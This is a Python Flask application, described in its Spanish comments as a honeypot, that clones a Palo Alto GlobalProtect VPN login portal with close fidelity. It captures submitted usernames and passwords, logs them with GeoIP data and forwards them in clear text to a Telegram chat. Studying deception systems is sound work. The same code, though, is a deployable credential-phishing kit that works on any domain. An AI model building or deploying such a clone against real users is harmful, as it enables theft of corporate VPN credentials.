#!/usr/bin/env python3
"""
app.py — honeypot de Palo Alto GlobalProtect (portal PAN-OS, estático).

Sirve la copia de static_cache/ replicando la estructura de URLs, los códigos de
estado y las cabeceras del portal original, y captura las credenciales que le
llegan (honeypot.log con todo, creds.log sólo con las capturas).

El host del que se capturó la copia se lee de static_cache/_meta.json y se
reescribe al host de cada petición, así que el honeypot es agnóstico de marca:
sirve igual en el dominio original o en uno de laboratorio.
"""
import os, re, json, uuid, time, random, string, mimetypes, logging
import urllib.request
from html import escape
from pathlib import Path
from datetime import datetime, timezone
from email.utils import formatdate
from flask import Flask, request, Response

# ─── Config ──────────────────────────────────────────────────────────────────
BASE_DIR    = Path(__file__).parent
STATIC_DIR  = BASE_DIR / "static_cache"
# Dónde se escriben las capturas. En un servidor es la propia carpeta; en
# plataformas sin disco (Vercel) hay que apuntar a /tmp con HONEYPOT_DATA_DIR.
DATA_DIR    = Path(os.environ.get("HONEYPOT_DATA_DIR") or BASE_DIR)
LOG_FILE    = DATA_DIR / "honeypot.log"
CREDS_FILE  = DATA_DIR / "creds.log"          # solo CREDENTIAL_CAPTURE events
LOG_LEVEL   = os.environ.get("LOG_LEVEL", "INFO")

# Modo debug: los fallos accesorios (aviso de Telegram, geolocalización, disco)
# se callan salvo que se pida verlos, con HONEYPOT_DEBUG=1 o LOG_LEVEL=DEBUG.
DEBUG = os.environ.get("HONEYPOT_DEBUG") == "1" or LOG_LEVEL.upper() == "DEBUG"

# Rutas del portal original.
LOGIN_PAGE  = "/global-protect/login.esp"
LOGOUT_PAGE = "/global-protect/logout.esp"

# Página 404 del frontal (respaldo por si la captura no trae 404.html).
NOT_FOUND_HTML = (
    b"<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n"
    b"<center><h1>404 Not Found</h1></center>\r\n<hr><center></center>\r\n"
    b"</body>\r\n</html>\r\n"
)

# El frontal rellena las páginas de error pequeñas (nginx) cuando el cliente es
# Chrome o MSIE: el mismo comentario repetido hasta pasar de 512 B. Medido
# contra el portal real: «Chrome/» o «MSIE » (con espacio) rellenan; Firefox,
# Safari, Edge, Chromium, curl o python-requests no.
PADDING_LINE = b"<!-- a padding to disable MSIE and Chrome friendly error page -->\r\n"

# Lo que devuelve el portal cuando el POST no lleva una sesión válida.
SESSION_DEAD = (
    '<html>\n'
    '    <script>window.location="/global-protect/logout.esp?code=6";</script></html>'
)

# Cabeceras de seguridad que pone el portal en todas sus páginas.
SECURITY_HEADERS = {
    "X-Frame-Options":           "DENY",
    "Strict-Transport-Security": "max-age=31536000;",
    "X-XSS-Protection":          "1; mode=block",
    "X-Content-Type-Options":    "nosniff",
    "Content-Security-Policy":   ("default-src 'self'; script-src 'self' 'unsafe-inline'; "
                                  "img-src * data:; style-src 'self' 'unsafe-inline'; "
                                  "frame-ancestors 'none';"),
}

# Nombres de campos de credenciales (regex sobre las claves del formulario).
# `inputStr` es el campo del segundo factor, no un usuario: si se cuela aquí se
# queda con el hueco del usuario antes de que llegue `user`.
CRED_USER_FIELDS = re.compile(r"user(name)?|login|email", re.I)
CRED_PASS_FIELDS = re.compile(r"pass(word)?|pwd|secret", re.I)

# El portal real contesta «Invalid username or password» y repinta el formulario
# con el usuario que se envió.
LOGIN_ERROR = "Invalid username or password"

# ─── Logging ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.INFO),
    format="[%(asctime)s] %(levelname)s %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("honeypot")


def _aviso(msg: str) -> None:
    """
    Aviso de algo accesorio que falló (el envío del aviso, la geolocalización, el
    disco). En operación normal no ensucia el log: un honeypot recibe mucho
    ruido y el operador sólo quiere ver las capturas. Con HONEYPOT_DEBUG=1 (o
    LOG_LEVEL=DEBUG) sí se cuentan las cosas.
    """
    if DEBUG:
        log.warning(msg)


# ─── GeoIP lookup (async, non-blocking) ──────────────────────────────────────
_geoip_cache: dict = {}


def _geoip(ip: str) -> dict:
    """Devuelve dict con country/city/org para una IP. Cachea resultados."""
    if not ip or ip in ("127.0.0.1", "::1"):
        return {}
    if ip in _geoip_cache:
        return _geoip_cache[ip]
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,city,isp,org,as,query"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=4) as r:
            data = json.loads(r.read().decode())
        if data.get("status") == "success":
            result = {k: data[k] for k in ("country", "countryCode", "city", "isp", "org", "as") if k in data}
            _geoip_cache[ip] = result
            return result
    except Exception as e:
        _aviso(f"[geo] no se pudo geolocalizar {ip}: {e}")
    return {}


# ─── Telegram notificación ────────────────────────────────────────────────────
def _h(valor) -> str:
    """
    Escapa un valor para el HTML de Telegram.

    El aviso se manda con parse_mode=HTML, así que un `<` en el usuario o en el
    User-Agent rompería el mensaje entero: Telegram lo rechaza con «can't parse
    entities» y la alerta se pierde. Y sin escapar, un `</code><a href=...>`
    inyecta enlaces en el aviso que lee el operador.
    """
    return escape(str(valor), quote=False)


def _mensaje_credenciales(username, password, ip, ua, path, geo) -> str:
    """Texto del aviso, con todo lo que viene del atacante ya escapado."""
    geo_str = ""
    if geo:
        geo_str = (f"\n🌍 <b>Geo:</b> {_h(geo.get('city', '?'))}, "
                   f"{_h(geo.get('country', '?'))} ({_h(geo.get('countryCode', '?'))})")
        if geo.get("org"):
            geo_str += f"\n🏢 <b>Org:</b> {_h(geo['org'])}"

    return (
        f"🎣 <b>CREDENTIAL CAPTURED</b> (GlobalProtect)\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>User:</b> <code>{_h(username or '?')}</code>\n"
        f"🔑 <b>Pass:</b> <code>{_h(password or '?')}</code>\n"
        f"🌐 <b>IP:</b> <code>{_h(ip)}</code>{geo_str}\n"
        f"🖥 <b>UA:</b> <code>{_h(ua[:80])}</code>\n"
        f"📍 <b>Path:</b> <code>{_h(path)}</code>\n"
        f"🕐 <b>TS:</b> {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC"
    )


def _tg_config():
    """
    Credenciales del bot. Se usan los nombres de ShellGuard y se aceptan los
    cortos (TG_TOKEN/TG_CHAT_ID/TG_TOPIC_ID) como alias.
    """
    token = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("TG_TOKEN", "")
    chat  = os.environ.get("TELEGRAM_CHAT_ID") or os.environ.get("TG_CHAT_ID", "")
    topic = os.environ.get("TELEGRAM_TOPIC_ID") or os.environ.get("TG_TOPIC_ID", "")
    return token, chat, topic


def _tg_notify(text: str):
    """
    Manda el aviso a un grupo (y a un topic concreto, si se indica).

    Mismo formato que ShellGuard: `sendMessage` con `chat_id`, `text` y
    `message_thread_id` cuando el grupo es de tipo foro. Va síncrono a
    propósito: en serverless (Vercel) un hilo en segundo plano puede morir
    cuando termina la respuesta, y perder una captura es lo peor que le puede
    pasar a un honeypot.
    """
    token, chat, topic = _tg_config()
    if not token or not chat:
        return
    try:
        payload = {
            "chat_id": chat,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }
        if topic:
            # El id del topic es el número que sale en el enlace del mensaje
            # dentro del grupo (t.me/c/<grupo>/<topic>).
            payload["message_thread_id"] = int(topic) if topic.lstrip("-").isdigit() else topic
        req = urllib.request.Request(
            f"https://api.telegram.org/bot{token}/sendMessage",
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=5) as r:
            data = json.loads(r.read().decode())
        if not data.get("ok"):
            _aviso(f"[TG] Telegram rechazó el mensaje: {data.get('description')}")
    except Exception as e:
        _aviso(f"[TG] Error notificando: {e}")


# ─── Log utils ────────────────────────────────────────────────────────────────
def _append_line(path: Path, line: str) -> None:
    """Escribe una línea sin que un fallo de disco tumbe la respuesta.

    En plataformas con el sistema de ficheros de sólo lectura (Vercel) esto se
    lleva a /tmp con HONEYPOT_DATA_DIR; si aun así no se puede escribir, se
    avisa por stderr y la petición sigue.
    """
    try:
        with open(path, "a") as f:
            f.write(line + "\n")
    except OSError as e:
        _aviso(f"[log] no se pudo escribir {path}: {e}")


def _log_event(event: str, extra: dict = None):
    entry = {"ts": datetime.now(timezone.utc).isoformat(), "event": event}
    if extra:
        entry.update(extra)
    line = json.dumps(entry, ensure_ascii=False)
    log.info(line)
    _append_line(LOG_FILE, line)
    if event == "CREDENTIAL_CAPTURE":
        _append_line(CREDS_FILE, line)


# ─── Flask app ────────────────────────────────────────────────────────────────
app = Flask(__name__, static_folder=None)
app.config["PROPAGATE_EXCEPTIONS"] = True


# ─── WSGI middleware: Date y nada de Server ──────────────────────────────────
class PortalHeaderMiddleware:
    """
    El portal original NO manda cabecera `Server` (la esconde) y sí manda `Date`.

    El servidor que nos escucha escribiría la suya, así que se arranca uvicorn
    con `--no-server-header --no-date-header` (ver run.sh) y aquí se quita la
    que pudiera venir de la aplicación y se pone el Date.
    """

    def __init__(self, wsgi_app):
        self.app = wsgi_app

    def __call__(self, environ, start_response):
        def patched_start_response(status, headers, exc_info=None):
            headers = [
                (k, v) for k, v in headers
                if k.lower() not in ("server", "date", "x-powered-by")
            ]
            headers.append(("Date", formatdate(usegmt=True)))
            return start_response(status, headers, exc_info)

        return self.app(environ, patched_start_response)


app.wsgi_app = PortalHeaderMiddleware(app.wsgi_app)


# ─── Helpers ──────────────────────────────────────────────────────────────────
HOST_PLACEHOLDER = "{{HOST}}"


def _rewrite_hosts(text: str) -> str:
    """Sustituye el marcador de host por el de la petición."""
    if HOST_PLACEHOLDER not in text:
        return text
    return text.replace(HOST_PLACEHOLDER, request.host)


def _maybe_rewrite(raw: bytes, ctype: str) -> bytes:
    if not re.match(r"^(text/|application/(json|xml|javascript|x-javascript))",
                    ctype or "", re.I):
        return raw
    try:
        return _rewrite_hosts(raw.decode("utf-8")).encode("utf-8")
    except UnicodeDecodeError:
        return raw


_meta_cache: list = []


def _meta() -> dict:
    """Cabeceras/estados grabados durante la captura (static_cache/_meta.json)."""
    if not _meta_cache:
        try:
            _meta_cache.append(json.loads((STATIC_DIR / "_meta.json").read_text()))
        except Exception as e:
            _aviso(f"[meta] no se pudo leer _meta.json: {e}")
            _meta_cache.append({})
    return _meta_cache[0]


# Cabeceras que nunca se reenvían: las pone el servidor que sirve.
_SKIP_HEADERS = {
    "content-length", "transfer-encoding", "connection", "keep-alive",
    "date", "server", "set-cookie", "etag", "last-modified", "accept-ranges",
    "age", "via",
}


def _captured_headers(key: str) -> dict:
    """Cabeceras reales que el portal devolvió para ese recurso."""
    raw = (_meta().get(key) or {}).get("headers") or {}
    out = {}
    for k, v in raw.items():
        if k.lower() in _SKIP_HEADERS:
            continue
        out[k] = _rewrite_hosts(v) if isinstance(v, str) else v
    return out


def _static_path(url_path: str):
    """Resuelve url_path a un fichero de static_cache/."""
    clean = url_path.split("?")[0].split("#")[0].lstrip("/")
    for candidate in (STATIC_DIR / clean, STATIC_DIR / clean / "index.html"):
        try:
            resolved = candidate.resolve()
            if str(resolved).startswith(str(STATIC_DIR.resolve())) and resolved.is_file():
                return resolved
        except Exception:
            pass
    return None


def _serve_static(path: str, extra_headers: dict = None):
    """Sirve un fichero del static_cache; None si no existe."""
    fpath = _static_path(path)
    if fpath is None:
        return None

    raw = fpath.read_bytes()
    # Los .esp no están en mimetypes: se usa el Content-Type que ya se capturó
    # del portal real para ese recurso.
    ctype = (_meta().get(path.lstrip("/")) or {}).get("ctype")
    if not ctype:
        ctype, _ = mimetypes.guess_type(str(fpath))
    if ctype is None:
        if raw.startswith(b"<?xml"):
            ctype = "application/xml"
        elif raw.startswith(b"{"):
            ctype = "application/json"
        elif raw.lstrip()[:9].lower() in (b"<!doctype", b"<html"):
            ctype = "text/html; charset=UTF-8"
        else:
            ctype = "application/octet-stream"

    resp = Response(_maybe_rewrite(raw, ctype), status=200, content_type=ctype)
    for k, v in _captured_headers(path.lstrip("/")).items():
        resp.headers[k] = v
    if extra_headers:
        for k, v in extra_headers.items():
            resp.headers[k] = v
    return resp


def _not_found() -> Response:
    """
    404 del frontal, idéntico al del portal real.

    Con un navegador son 543 B (141 + seis líneas de relleno) y con cualquier
    otro cliente 141 B, que es justo lo que hace el original.
    """
    fpath = STATIC_DIR / "404.html"
    body = fpath.read_bytes() if fpath.is_file() else NOT_FOUND_HTML
    body = body.split(b"<!--")[0]          # por si la captura ya venía rellena

    ua = request.headers.get("User-Agent", "")
    if "Chrome/" in ua or "MSIE " in ua:
        while len(body) < 512:
            body += PADDING_LINE

    resp = Response(body, status=404, content_type="text/html")
    for k, v in SECURITY_HEADERS.items():
        resp.headers[k] = v
    # El 404 real no lleva frame-ancestors en la CSP.
    resp.headers["Content-Security-Policy"] = (
        "default-src 'self'; script-src 'self' 'unsafe-inline'; img-src * data:; "
        "style-src 'self' 'unsafe-inline';"
    )
    return resp


def _sessid_cookie(resp: Response) -> None:
    """Cookie de sesión nueva, como la que reparte el portal en cada página."""
    resp.headers["Set-Cookie"] = (
        f"SESSID={uuid.uuid4()}; Path=/; SameSite=Lax; HttpOnly; Secure"
    )


def _capture_credentials():
    """Extrae y loguea las credenciales del POST, con GeoIP y aviso Telegram."""
    username = password = None
    extra_fields = {}
    ct = request.content_type or ""

    if "application/x-www-form-urlencoded" in ct or "multipart/form-data" in ct:
        items = list(request.form.items())
    elif "application/json" in ct:
        data = request.get_json(force=True, silent=True) or {}
        items = [(k, str(v)) for k, v in data.items()]
    else:
        items = []

    for key, val in items:
        # Un campo vacío no fija nada: así el `user` de verdad no lo pisa un
        # `inputStr` vacío que llegue antes.
        if CRED_USER_FIELDS.search(key) and not username:
            username = val or None
        elif CRED_PASS_FIELDS.search(key) and not password:
            password = val or None
        else:
            extra_fields[key] = val

    if not (username or password):
        return None, None

    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")
    geo = _geoip(ip)

    _log_event("CREDENTIAL_CAPTURE", {
        "path":         request.full_path.rstrip("?"),
        "ip":           ip,
        "ua":           ua,
        "referer":      request.headers.get("Referer", ""),
        "username":     username,
        "password":     password,
        "extra_fields": extra_fields,
        "raw_body":     request.get_data(as_text=True)[:512],
        "content_type": ct,
        "geo":          geo,
    })

    _tg_notify(_mensaje_credenciales(username, password, ip, ua,
                                     request.path, geo))
    return username, password


# ─── Before/after request ─────────────────────────────────────────────────────
@app.before_request
def _log_request():
    _log_event("request", {
        "method":  request.method,
        "path":    request.path,
        "query":   request.query_string.decode("utf-8", errors="replace"),
        "ip":      request.remote_addr,
        "ua":      request.headers.get("User-Agent", ""),
        "referer": request.headers.get("Referer", ""),
    })


# ─── Plantilla de la página de logon ──────────────────────────────────────────
_CSRF_RE     = re.compile(rb'(name="csrf-token"\s+value=")[^"]*(")')
_USER_RE     = re.compile(rb'(<input type="text" id="user" name="user"[^>]*?)>')
_VALUEUSER_RE = re.compile(rb'var valueUser = "[^"]*";')
_ERRMSG_RE   = re.compile(rb'var errMsg = "[^"]*";')
_RESPMSG_RE  = re.compile(rb'var respMsg = "[^"]*";')
_LOGOUT_IDX_RE = re.compile(
    rb"\$\('div#logout'\)\.text\(logout_text_array\[\s*\d+\s*\]\);"
)


def _new_csrf() -> str:
    """Token con la pinta del que reparte PAN-OS: 28 caracteres y epoch en ms."""
    alfabeto = string.ascii_letters + string.digits + "_-"
    token = "".join(random.choice(alfabeto) for _ in range(28))
    return f"{token}:{int(time.time() * 1000)}"


def _login_page(error_user: str = None) -> bytes:
    """
    Página de logon con un csrf-token nuevo (el real lo cambia en cada visita).

    Si `error_user` viene, se repinta con el error de credenciales y el usuario
    que se envió, que es lo que hace el portal cuando el logon falla.
    """
    fpath = STATIC_DIR / "global-protect" / "login.esp"
    if not fpath.is_file():
        return b"<html><body>GlobalProtect Portal</body></html>"
    html = fpath.read_bytes()

    token = _new_csrf().encode()
    html = _CSRF_RE.sub(lambda m: m.group(1) + token + m.group(2), html, count=1)

    if error_user is not None:
        escapado = (error_user.replace("&", "&amp;").replace('"', "&quot;")
                    .replace("<", "&lt;").replace(">", "&gt;")).encode()
        # OJO: en la rama `respStatus == "Error"` la propia página hace
        # `errMsg += "<li>" + respMsg`, así que el texto va en respMsg y errMsg
        # se queda vacío. Poniéndolo en los dos saldría duplicado.
        html = _ERRMSG_RE.sub(b'var errMsg = "";', html, count=1)
        html = _RESPMSG_RE.sub(b'var respMsg = "' + LOGIN_ERROR.encode() + b'";',
                               html, count=1)
        html = _VALUEUSER_RE.sub(b'var valueUser = "' + escapado + b'";', html, count=1)
        html = _USER_RE.sub(lambda m: m.group(1) + b' value="' + escapado + b'">',
                            html, count=1)
    return html


def _logout_page(code: int) -> bytes:
    """Página de sesión cerrada, con el mensaje que toca según `code`."""
    fpath = STATIC_DIR / "global-protect" / "logout.esp"
    if not fpath.is_file():
        return b"<html><body>GlobalProtect Portal</body></html>"
    html = fpath.read_bytes()
    html = _LOGOUT_IDX_RE.sub(
        b"$('div#logout').text(logout_text_array[ " + str(code).encode() + b" ]);",
        html, count=1,
    )
    return html


def _html_response(body: bytes, status: int = 200) -> Response:
    resp = Response(_maybe_rewrite(body, "text/html"), status=status,
                    content_type="text/html; charset=UTF-8")
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, post-check=0, pre-check=0"
    for k, v in SECURITY_HEADERS.items():
        resp.headers[k] = v
    return resp


# ─── Routes ───────────────────────────────────────────────────────────────────

# ── Raíz: el portal manda al logon con un salto por JavaScript ────────────────
@app.route("/", defaults={"path": ""}, methods=["GET", "HEAD"])
@app.route("/<path:path>", methods=["GET", "HEAD"])
def root_redirect(path):
    if path:
        return _not_found()
    body = ('<script LANGUAGE="JavaScript">\n'
            'window.location="/global-protect/login.esp";\n'
            '</script>\n'
            '<html><head></head><body><p>JavaScript must be enabled to continue!</p></body></html>\n')
    resp = Response(body, status=302, content_type="text/html; charset=UTF-8")
    resp.headers["Location"] = LOGIN_PAGE
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, post-check=0, pre-check=0"
    for k, v in SECURITY_HEADERS.items():
        resp.headers[k] = v
    _sessid_cookie(resp)
    return resp


# ── Página de logon (GET) y envío de credenciales (POST) ──────────────────────
@app.route(LOGIN_PAGE, methods=["GET", "POST", "HEAD"])
def login_esp():
    if request.method == "POST":
        # Sin el csrf-token de su propia sesión, el portal real da la sesión por
        # muerta y manda a logout.esp?code=6.
        if not request.form.get("csrf-token"):
            resp = _html_response(SESSION_DEAD.encode())
            _sessid_cookie(resp)
            return resp

        username, _ = _capture_credentials()
        resp = _html_response(_login_page(error_user=username or ""))
        _sessid_cookie(resp)
        return resp

    resp = _html_response(_login_page())
    _sessid_cookie(resp)
    return resp


# ── Página de sesión cerrada / caducada ───────────────────────────────────────
@app.route(LOGOUT_PAGE, methods=["GET", "POST", "HEAD"])
def logout_esp():
    try:
        code = int(request.args.get("code", "0"))
    except ValueError:
        code = 0
    resp = _html_response(_logout_page(code))
    _sessid_cookie(resp)
    return resp


# ── Resto del árbol del portal ────────────────────────────────────────────────
@app.route("/global-protect/<path:subpath>", methods=["GET", "POST", "HEAD"])
def global_protect(subpath):
    resp = _serve_static(f"global-protect/{subpath}")
    return resp if resp is not None else _not_found()


@app.route("/ssl-vpn/<path:subpath>", methods=["GET", "POST", "HEAD"])
def ssl_vpn(subpath):
    resp = _serve_static(f"ssl-vpn/{subpath}")
    return resp if resp is not None else _not_found()


# ─── Entry point ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import sys
    port = int(os.environ.get("PORT", 8443))
    debug = "--dev" in sys.argv
    log.info(f"Starting GlobalProtect honeypot on :{port} (debug={debug})")
    log.info(f"Static cache: {STATIC_DIR} ({len(list(STATIC_DIR.rglob('*')))} items)")
    app.run(host="0.0.0.0", port=port, debug=debug, use_reloader=False)
